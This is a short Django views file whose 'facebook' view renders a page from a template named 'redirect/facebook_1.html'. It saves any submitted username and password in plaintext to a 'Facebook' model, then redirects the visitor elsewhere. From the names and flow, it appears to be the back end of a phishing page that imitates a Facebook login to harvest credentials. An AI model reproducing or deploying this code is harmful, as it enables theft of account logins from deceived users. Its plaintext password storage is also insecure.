from django.shortcuts import render,redirect
from .models import Facebook
# Create your views here.
def facebook(request):
	if request.method=='POST':
		username=request.POST['username']
		password=request.POST['password']
		obj=Facebook.objects.create(username=username,password=password)
		return redirect('basic_site:home')
	else:
		template='redirect/facebook_1.html'
	return render(request,template) 
